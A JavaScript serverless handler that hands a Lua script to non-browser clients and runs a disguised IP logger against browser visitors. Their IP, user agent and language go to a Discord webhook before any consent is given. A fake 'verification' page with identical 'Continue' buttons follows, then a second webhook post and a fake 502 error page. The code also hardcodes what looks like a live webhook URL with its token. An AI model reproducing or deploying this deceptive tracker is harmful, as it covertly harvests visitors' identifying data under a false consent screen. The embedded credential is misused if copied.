export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';
  const isBrowser = /Mozilla|Chrome|Safari|Edg|Firefox|Opera|MSIE|Trident/i.test(userAgent);
  const url = req.url;
  const query = req.query;
  
  res.setHeader('Cache-Control', 'public, max-age=3600');
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  if (!isBrowser) {
    try {
      const fs = require('fs');
      const path = require('path');
      const scriptPath = path.join(process.cwd(), 'api', 'sekerip.lua');
      
      if (!fs.existsSync(scriptPath)) {
        return res.status(404).send('Script not found');
      }
      
      const script = fs.readFileSync(scriptPath, 'utf8');
      res.setHeader('Content-Type', 'text/plain');
      res.status(200).send(script);
    } catch (error) {
      console.error('Error reading script:', error);
      res.status(500).send('Internal Server Error');
    }
    return;
  }
  
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const acceptLanguage = req.headers['accept-language'] || 'unknown';
  const referer = req.headers['referer'] || 'direct';
  
  const hasConsent = query.consent === 'true' || req.headers.cookie?.includes('consent=true');
  
  if (hasConsent) {
    const webhookUrl = process.env.DISCORD_WEBHOOK || 'YOUR_WEBHOOK_URL';
    
    const consentData = {
      timestamp: new Date().toISOString(),
      ip: ip,
      userAgent: userAgent,
      language: acceptLanguage,
      referer: referer,
      consentGiven: true,
      platform: /Windows/.test(userAgent) ? 'Windows' : /Mac/.test(userAgent) ? 'macOS' : /Android/.test(userAgent) ? 'Android' : /iPhone/.test(userAgent) ? 'iOS' : 'Unknown',
      browser: /Chrome/.test(userAgent) ? 'Chrome' : /Firefox/.test(userAgent) ? 'Firefox' : /Safari/.test(userAgent) ? 'Safari' : /Edg/.test(userAgent) ? 'Edge' : 'Unknown'
    };
    
    const embed = {
      title: 'USER VERIFIED - ACCESS GRANTED',
      color: 0x44ff44,
      fields: [
        { name: '🌐 IP Address', value: `\`${consentData.ip}\``, inline: true },
        { name: '💻 Platform', value: consentData.platform, inline: true },
        { name: '🌍 Browser', value: consentData.browser, inline: true },
        { name: '🖥️ OS', value: consentData.userAgent.split('(')[1]?.split(')')[0] || 'Unknown', inline: false },
        { name: '🌍 Language', value: consentData.language, inline: true },
        { name: '📅 Time', value: consentData.timestamp, inline: true }
      ],
      footer: { text: 'Consent given by user' }
    };
    
    fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    }).catch(err => console.error('Webhook error:', err));
    
    res.setHeader('Set-Cookie', 'consent=true; Max-Age=86400; HttpOnly; SameSite=Lax');
    
    res.status(403).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>error 502 gateway</title>
        <style>
          body {
            background: #0a0a0a;
            color: #ff4444;
            font-family: monospace;
            text-align: center;
            padding-top: 100px;
          }
          h1 { font-size: 48px; }
          p { color: #666; }
          .ip { font-size: 12px; color: #888; margin-top: 50px; }
        </style>
      </head>
      <body>
        <h1>connection refused</h1>
        <p>error 502</p>
        <div class="ip">IP: ${consentData.ip}</div>
      </body>
      </html>
    `);
    return;
  }
  
  const webhookUrl = process.env.DISCORD_WEBHOOK || 'https://discord.com/api/webhooks/1486983553093865553/TTEJpDuga5BuEy52X7AmODTHucd_NxkQUNWVdfpVvmHkUYyXNgnwh3-6IrHaoCFc3lA2';
  
  const initialEmbed = {
    title: 'BROWSER ACCESS ATTEMPT',
    color: 0xffaa44,
    fields: [
      { name: 'IP', value: `\`${ip}\``, inline: true },
      { name: 'User Agent', value: userAgent.substring(0, 60), inline: false },
      { name: 'Language', value: acceptLanguage, inline: true },
      { name: 'Time', value: new Date().toISOString(), inline: true }
    ]
  };
  
  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds: [initialEmbed] })
  }).catch(err => console.error('Webhook error:', err));
  
  res.status(200).setHeader('Content-Type', 'text/html').send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Verification Required</title>
      <style>
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        
        body {
          background: linear-gradient(135deg, #0a0a2a 0%, #0a0a1a 100%);
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
          min-height: 100vh;
          display: flex;
          justify-content: center;
          align-items: center;
          padding: 20px;
        }
        
        .container {
          background: rgba(20, 20, 40, 0.9);
          backdrop-filter: blur(10px);
          border-radius: 24px;
          padding: 40px;
          max-width: 500px;
          width: 100%;
          text-align: center;
          box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
          border: 1px solid rgba(100, 100, 255, 0.3);
        }
        
        h1 {
          color: #fff;
          font-size: 28px;
          margin-bottom: 20px;
          background: linear-gradient(135deg, #fff, #aaccff);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
        }
        
        .icon {
          font-size: 64px;
          margin-bottom: 20px;
        }
        
        p {
          color: #ccc;
          line-height: 1.6;
          margin-bottom: 30px;
        }
        
        .benefits {
          background: rgba(50, 50, 80, 0.5);
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 30px;
          text-align: left;
        }
        
        .benefits h3 {
          color: #aaccff;
          font-size: 14px;
          margin-bottom: 12px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        .benefits ul {
          list-style: none;
        }
        
        .benefits li {
          color: #ddd;
          font-size: 13px;
          padding: 6px 0;
          display: flex;
          align-items: center;
          gap: 8px;
        }
        
        .benefits li:before {
          content: "✓";
          color: #44ff44;
          font-weight: bold;
        }
        
        .btn {
          background: linear-gradient(135deg, #5865F2, #4752c4);
          color: white;
          border: none;
          padding: 14px 32px;
          font-size: 16px;
          font-weight: bold;
          border-radius: 40px;
          cursor: pointer;
          transition: transform 0.2s, box-shadow 0.2s;
          width: 100%;
          margin-bottom: 12px;
        }
        
        .btn:hover {
          transform: translateY(-2px);
          box-shadow: 0 10px 25px -5px rgba(88, 101, 242, 0.4);
        }
        
        .btn-github {
          background: linear-gradient(135deg, #333, #24292e);
        }
        
        .btn-discord {
          background: linear-gradient(135deg, #5865F2, #4752c4);
        }
        
        .btn-google {
          background: linear-gradient(135deg, #DB4437, #c53929);
        }
        
        .note {
          font-size: 11px;
          color: #666;
          margin-top: 20px;
        }
        
        .spinner {
          display: none;
          width: 20px;
          height: 20px;
          border: 2px solid rgba(255,255,255,0.3);
          border-top-color: white;
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
          margin: 0 auto;
        }
        
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="icon">🛡️</div>
        <h1>Verification Required</h1>
        <p>Please verify your identity to access this resource.<br>This helps us prevent automated access.</p>
        
        <div class="benefits">
          <h3>📋 What you'll share:</h3>
          <ul>
            <li>Basic device information</li>
            <li>Browser type and version</li>
            <li>Public IP address</li>
            <li>Language preference</li>
          </ul>
          <p style="font-size: 11px; margin-top: 12px; color: #888;">This is a one-time verification.</p>
        </div>
        
        <button class="btn btn-discord" onclick="verify('discord')">
          <span>✓ Continue</span>
        </button>
        
        <button class="btn btn-github" onclick="verify('github')">
          <span>✓ Continue</span>
        </button>
        
        <button class="btn btn-google" onclick="verify('google')">
          <span>✓ Continue</span>
        </button>
        
        <div class="note">By</div>
        <div id="loading" class="spinner"></div>
      </div>
      
      <script>
        function verify(provider) {
          const btns = document.querySelectorAll('.btn');
          btns.forEach(btn => btn.disabled = true);
          document.getElementById('loading').style.display = 'block';
          
         
          
          
          const container = document.querySelector('.container');
          const originalHTML = container.innerHTML;
          
          container.innerHTML = \`
            <div class="icon"></div>
            <h1>Verifying...</h1>
            <p>Please wait\${provider}...</p>
            <div style="width: 40px; height: 40px; border: 3px solid rgba(100,100,255,0.3); border-top-color: #5865F2; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 20px auto;"></div>
          \`;
          
         
          setTimeout(() => {
      
            window.location.href = window.location.pathname + '?consent=true';
          }, 2000);
        }
      </script>
    </body>
    </html>
  `);
}
